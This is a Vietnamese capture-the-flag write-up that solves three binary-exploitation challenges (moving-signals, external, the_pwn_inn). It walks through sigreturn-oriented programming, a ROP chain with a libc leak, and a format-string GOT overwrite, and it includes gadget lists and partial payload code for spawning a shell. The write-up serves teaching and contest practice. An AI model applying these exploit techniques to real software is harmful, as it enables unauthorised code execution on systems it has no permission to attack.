
# Writeup 0x41414141
#   Author: sHawking
> # Challenge Name : moving-signals

## file challenge:  [moving-signals](https://github.com/19520611/Writeup/blob/main/0x41414141/src/moving-signals/moving-signals?raw=true)

Phân tích cơ bản:

file:
```
$ file moving-signals
moving-signals: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
checksec:
```
$ checksec  moving-signals
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x40000)
    RWX:      Has RWX segments
```
r2:
```
$ r2 moving-signals
[0x00041000]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00041000]> afl
0x00041000    1 24           entry0
[0x00041000]> pdf entry0
            ;-- section..shellcode:
            ;-- segment.LOAD1:
            ;-- .shellcode:
            ;-- __start:
            ;-- _start:
            ;-- rip:
┌ 24: entry0 ();
│           0x00041000      48c7c7000000.  mov rdi, 0                  ; [01] -rwx section size 26 named .shellcode
│           0x00041007      4889e6         mov rsi, rsp
│           0x0004100a      4883ee08       sub rsi, 8
│           0x0004100e      48c7c2f40100.  mov rdx, 0x1f4              ; 500
│           0x00041015      0f05           syscall
└           0x00041017      c3             ret
[0x00041000]>
```
Qua công cụ r2 ta quan sát được luồng thực thi chính của chương trình. Quan sát các gadget.

Ropgadget:
```
$ ROPgadget  --binary moving-signals
Gadgets information
============================================================
0x0000000000041013 : add byte ptr [rax], al ; syscall
0x000000000004100f : mov edx, 0x1f4 ; syscall
0x000000000004100e : mov rdx, 0x1f4 ; syscall
0x000000000004100d : or byte ptr [rax - 0x39], cl ; ret 0x1f4
0x000000000004100c : out dx, al ; or byte ptr [rax - 0x39], cl ; ret 0x1f4
0x0000000000041018 : pop rax ; ret
0x0000000000041017 : ret
0x0000000000041010 : ret 0x1f4
0x0000000000041015 : syscall

Unique gadgets found: 9
```
Vì có gadget ```pop rax ; ret``` nên ta có thể điều khiển được $rax. Mình sẽ sử dụng syscall rt_sigreturn ($rax = 0xf)
  
Ta sẽ đưa các fake frame vào stack và làm cho rt_sigreturn gọi syscall với các fake frame của ta. Fake frame:
- rax = 0x3b (sys_execve)
- rdi = 0x41250
- rip = 0x41015 (syscall)

Tìm địa chỉ của ```/bin/sh``` trong chương trình:
```
pwndbg> search /bin/sh
moving-signals  0x41250 0x68732f6e69622f /* '/bin/sh' */
pwndbg>
```
Đã có đầy đủ payload của chúng ta sẽ như sau: payload = b'A'*8 + pop_rax + 0xf +syscall + frame.

Get flag:

### ![screenshot](https://github.com/19520611/Writeup/blob/main/0x41414141/img/moving.PNG)

### File solve: [exploit.py](https://github.com/19520611/Writeup/blob/main/0x41414141/src/moving-signals/moving.py)

> # Challenge name: external
## file challenge: [external](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/external?raw=true) [libc](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/libc-2.28.so?raw=true)

Phân tích file:

file:
```
$ file external
external: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=06cea603bc177acf3effdea190ad8a3c88a2a7a0, for GNU/Linux 3.2.0, not stripped
```
checksec:
```
$ checksec  external
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Xem mã giả bằng IDA pro:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-50h]

  puts("ROP me ;)");
  printf("> ", argv);
  read(0, &buf, 0xF0uLL);
  clear_got(0LL, &buf);
  return 0;
}
```
Ta dễ dàng nhận thấy lỗi buffer overflow xảy ra ở hàm read, khi buf nằm ở offset $rbp-0x32 mà hàm read lại đọc đến 0xf0. Nhưng lưu ý trong chương trình có hàm clear_got. Quan sát xem hàm này làm gì với got(global offset table):

GOT trước khi hàm clear_got được gọi:
```
0x403ff8:       0x0000000000000000      0x0000000000403e10
0x404008:       0x00007ffff7ffe180      0x00007ffff7fe85e0
0x404018 <puts@got.plt>:        0x00007ffff7e64550      0x00007ffff7e6b4b0
0x404028 <printf@got.plt>:      0x00007ffff7e44c50      0x0000000000401066
0x404038 <alarm@got.plt>:       0x00007ffff7eb9270      0x00007ffff7edcde0
0x404048 <signal@got.plt>:      0x00007ffff7e29ac0      0x0000000000000000
0x404058:       0x0000000000000000      0x00007ffff7fad6a0
0x404068:       0x0000000000000000      0x00007ffff7fac980
0x404078 <completed.0>: 0x0000000000000000      0x0000000000000000
0x404088:       0x0000000000000000      0x0000000000000000
0x404098:       0x0000000000000000      0x0000000000000000
```
GOT sau khi hàm clear_got được gọi:
```
0x403ff8:       0x0000000000000000      0x0000000000403e10
0x404008:       0x00007ffff7ffe180      0x00007ffff7fe85e0
0x404018 <puts@got.plt>:        0x0000000000000000      0x0000000000000000
0x404028 <printf@got.plt>:      0x0000000000000000      0x0000000000000000
0x404038 <alarm@got.plt>:       0x0000000000000000      0x0000000000000000
0x404048 <signal@got.plt>:      0x0000000000000000      0x0000000000000000
0x404058:       0x0000000000000000      0x00007ffff7fad6a0
0x404068:       0x0000000000000000      0x00007ffff7fac980
0x404078 <completed.0>: 0x0000000000000000      0x0000000000000000
```
Quan sát got ta thấy rằng địa chỉ của các hàm libc trong main đã bị xóa. Nên nếu ta điều khiển chương trình quay lại hàm main hay nhảy đến 1 hàm đã bị xóa trong got thì chương trình sẽ bị crash.

Quan sát 2 địa chỉ nằm dưới got của signal:
```
pwndbg> x/x 0x00007ffff7fad6a0
0x7ffff7fad6a0 <_IO_2_1_stdout_>:       0x00000000fbad2887
pwndbg> x/x 0x00007ffff7fac980
0x7ffff7fac980 <_IO_2_1_stdin_>:        0x00000000fbad208b
```
Thì ra đây là địa chỉ của _IO_2_1_stdoin_ và _IO_2_1_stdout_. 

Quan sát các gadget:
```
$ ROPgadget  --binary external
Gadgets information
============================================================
              .....................
0x00000000004011a2 : call qword ptr [rax + 0x4855c35d]
0x0000000000401014 : call rax
0x0000000000401183 : cli ; jmp 0x401111
0x00000000004010d3 : cli ; ret
0x000000000040130b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401180 : endbr64 ; jmp 0x401114
0x00000000004010d0 : endbr64 ; ret
0x00000000004012dc : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401029
0x00000000004010ce : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401018 ; call rax
0x00000000004010f7 : je 0x401107 ; mov edi, 0x404060 ; jmp rax
0x0000000000401139 : je 0x40114f ; mov edi, 0x404060 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401184 : jmp 0x401110
0x00000000004010fe : jmp rax
0x00000000004011d8 : ; ret
0x00000000004010f9 : mov edi, 0x404060 ; jmp rax
0x0000000000401270 : mov rax, 0xe7 ; syscall
0x000000000040127c : mov rax, 1 ; syscall
0x00000000004010cf : nop ; endbr64 ; ret
0x00000000004011d7 : nop ; leave ; ret
0x00000000004011a3 : nop ; pop rbp ; ret
0x000000000040116f : nop ; ret
0x0000000000401143 : nop dword ptr [rax + rax] ; ret
0x000000000040117c : nop dword ptr [rax] ; endbr64 ; jmp 0x401118
0x0000000000401142 : nop word ptr [rax + rax] ; ret
0x0000000000401168 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040127b : or ecx, dword ptr [rax - 0x39] ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000401273 : out 0, eax ; add byte ptr [rax], al ; syscall
0x00000000004012ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ee : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012f0 : pop r14 ; pop r15 ; ret
0x00000000004012f2 : pop r15 ; ret
0x00000000004012eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012ef : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040116d : pop rbp ; ret
0x00000000004012f3 : pop rdi ; ret
0x00000000004012f1 : pop rsi ; pop r15 ; ret
0x00000000004012ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401277 : syscall
              ..................
Unique gadgets found: 106
```
Mình đã lọc bớt gadget hiển thị ra để WU đỡ dài. Quan sát gadget ta thấy ta có thể điều khiển được thanh ghi $rax (giá trị =0 và = 1), $rdi, $rsi và cả $rbp và $rsp nữa :)) và 1 gadget quan trọng đó là syscall.
> ## Ý tưởng khai thác:
> ### payload đầu tiên:
Ý tưởng khai thác:
- Đầu tiên mình sẽ đè bằng 1 địa chỉ mà mình xác định được có quyền write (mình chọn ở phân vùng .bss). Bởi vì khi lệnh leave (của hàm main) thực thi thì $rbp = address_bss mà mình đã ghì đè. 
- Tiếp theo tận dụng giá trị $rax bằng 0 sẵn có mình gọi syscall read, với giá trị của ```$rsi = address_bss```. Vậy tại sao mình lạ read ở address_bss? Bởi bị khi mình sử dụng gadget ```mov eax, 0 ; leave ; ret``` để set $eax = 0 để có thể gọi read lại thì lúc này đến lệnh leave (mình sẽ gọi là lệnh leave thứ 2) ```$rsp sẽ nằm tại``` địa chỉ của ```$rbp hiện tại tức address_bss```.
- Sau khi setup cho syscal read mình sẽ setup để syscall write được chạy. Lợi dụng syscall write mình sẽ set ```$rsi = got_IO_2_1_stdout_```,  Và fd sẽ bằng 1 tức thanh ghi ```$rdi```. Vậy khi syscall write chạy sẽ in ra got_IO_2_1_stdout_ và got_IO_2_1_stdin_ như mình đã đề cập trên got. Sử dụng gadget ```mov rax, 1 ; syscall``` để gọi syscall write
- Hàm write sẽ in ra ra cho ta 2 addr của _IO_2_1_stdout_ và _IO_2_1_stdin_ lên trang https://libc.blukat.me/ để search libc (Nhưng mình quên là tác giả cho sắn libc). sau đó tính libc base.
- Cuối của lần nhập đầu tiên ta sẽ chạy gadget ```mov rax, 1 ; syscall``` cho lần read thứ 2 (tức payload thứ 3) và điều khiển $rsp về  address_bss mà ta mong muốn 
```
    payload = "A"*0x50
    payload += p64(bss) # $rbp
    """ Goi syscall read để ghi input vào bss"""
    #payload += p64(func_rtc)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
    """Goi syscall write để in ra addr"""
    payload += p64(0x4012f1) # gadget pop rsi ; pop r15 ; ret
    payload += p64(0x404060) # got cua  got_IO_2_1_stdout_
    payload += p64(0)
    payload += p64(pop_rdi) 
    payload += p64(1)
    payload += p64(func_ws) # gadget mov rax, 1 ; syscall
    """Gán eax = 0 cho lần gọi read tiếp theo"""
    payload += p64(mov_eax_0_leave_ret)
```
> ### payload thứ 2:
- Đây là lần syscall read đầu tiên mà ta cho nó nhập trên address_bss. 
- Đầu tiên đây sẽ là địa chỉ mà sau khi lệnh ```leave thứ 2``` được gọi ```$rsp``` sẽ nhảy tới nên ta ghì đè bằng 1 giá trị bất kỳ.
- Tiếp theo mình sẽ setup ở đây 1 syscall read (gọi read lần 2) . Sau lệnh leave thứ 2 là lệnh ```ret``` chương trình sẽ thực thi gadget mà ở syscall read đầu tiên ta gọi. Mình sẽ gán $rsi = address_bss + 0x38 tức là sau gadget syscall để gọi read lần 2.
- Bởi vì ta gọi syscall read nên ta sẽ gán $rdi = 0 tức fd = 0
```
    payload = p64(0) # 8 byte giá trị bất kỳ ở đây
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(bss+0x38) # tức ta sẽ ghi input nhập vào sau gadget syscall ở dưới 
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(systemcall)
```
> ### payload thứ 3:
- Lúc này ta đã có libc base rồi, công việc lúc này là $rdi = address /bin/sh, gọi hàm system trong libc và lên shell.

Get flag:


![screenshot](https://github.com/19520611/Writeup/blob/main/0x41414141/img/external.jpg)


File solve: [exploit.py](https://github.com/19520611/Writeup/blob/main/0x41414141/src/external/external.py)

> # Challenge name: the_pwn_inn
## File challenge: [the_pwn_inn](https://github.com/19520611/Writeup/blob/main/0x41414141/src/the_pwn_inn/the_pwn_inn?raw=true)
Phân tích file:

file:
```
$ file the_pwn_inn
the_pwn_inn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=14fc1c701ef6aaae7b503071e34cc157ca6a2fad, for GNU/Linux 3.2.0, not stripped
```
checksec:
```
$ checksec the_pwn_inn
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```   
Xem mã giả bằng IDA pro:
```
// local variable allocation has failed, the output may be wrong!
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  ignore_me_init_buffering(*(_QWORD *)&argc, argv, envp);
  ignore_me_init_signal();
  puts("Welcome to the pwn inn! We hope that you enjoy your stay. What's your name? ");
  vuln();
}
```
Hàm này không có gì bất thường, ta đi vào hàm vuln() được gọi trong hàm main:
```
void __noreturn vuln()
{
  char s; // [rsp+0h] [rbp-110h]
  unsigned __int64 v1; // [rsp+108h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  fgets(&s, 256, stdin);
  printf("Welcome ", 256LL);
  printf(&s);
  exit(1);
}
```
Ta có thể thấy khá rõ lỗi format string ở đây. Phía dưới là hàm exit(), nên khi chạy vào hàm vuln chương trình sẽ exit ngay. Vậy thì ta chỉ cần ghì đè got của exit() bằng addr của hàm main hay vuln thì ta đã giải quyết được việc exit ngay của chương trình.
> ## Ý tưởng khai thác
> ### leak libc:
Nhập vào chuỗi quen thuộc: 
```
$ ./the_pwn_inn
Welcome to the pwn inn! We hope that you enjoy your stay. What's your name?
AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
Welcome AAAAAAAA.0x7ffd5276ee30.(nil).(nil).0x7ffd527714b0.0x8.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025
```
Ta thấy được offset mà format sting trỏ vào chuỗi ta nhập vào là 6. Truyền got của 2 hàm mà ta muốn trỏ tới sau đó dùng %s ta sẽ leak được địa chỉ của 2 hàm libc đó.
```
payload = " -%8$s- "
payload += " -%9$s- 
payload += p64(got_puts)
payload += p64(got_fgets)
```
Mình hay tra libc ở https://libc.blukat.me/. Sau đó tải libc này về.
> ### Lên shell:
Sử dụng công cụ one_gadget tìm gadget thích hợp:
```
$ one_gadget libc6_2.31-0ubuntu9.2_amd64.so
0xe6e73 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```
Mình sử dụng gadget 0xe6e76. Sau đó ta cộng gadget này với libc base, mình ghì đè got exit bằng địa chỉ vừa cộng này -> lên shell.

Get flag:

![screenshot](https://github.com/19520611/Writeup/blob/main/0x41414141/img/thepwn.PNG)

### File solve: [exploit.py](https://github.com/19520611/Writeup/blob/main/0x41414141/src/the_pwn_inn/ethe.py)







 

